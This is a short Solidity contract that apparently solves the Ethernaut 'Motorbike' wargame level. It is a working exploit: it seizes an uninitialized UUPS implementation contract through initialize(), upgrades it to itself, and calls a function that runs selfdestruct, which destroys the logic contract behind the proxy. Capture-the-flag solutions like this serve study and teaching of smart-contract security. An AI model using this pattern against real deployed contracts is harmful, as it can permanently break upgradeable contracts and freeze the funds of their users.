// SPDX-License-Identifier: MIT
pragma solidity <0.7.0;

import "./25Motorbike.sol";

contract MotorbikeSolution {
    Motorbike public motorbike;
    Engine public engine;

    constructor(address engineAddress) public {
        engine = Engine(engineAddress);
    }

    function solveChallenge() public {
        engine.initialize();
        engine.upgradeToAndCall(
            address(this),
            abi.encodeWithSignature("suicideMe()")
        );
    }

    function suicideMe() public {
        selfdestruct(msg.sender);
    }
}
